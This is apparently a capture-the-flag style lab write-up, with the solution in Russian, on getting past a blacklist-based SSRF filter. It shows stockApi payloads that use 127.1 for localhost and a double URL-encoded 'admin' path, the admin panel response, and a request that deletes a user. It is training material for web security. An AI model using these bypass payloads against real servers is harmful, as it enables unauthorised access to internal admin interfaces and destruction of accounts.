# SSRF with blacklist-based input filter
PRACTITIONER

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Решение
Вместо localhost передам 127.1, а строку "admin" дважды закодирую через URL-encoding:

`admin -> %61%64%6d%69%6e -> %25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

`stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

В ответ приходит интерфейс админской панели:
```
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```
`stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos`

Задание выполнено.
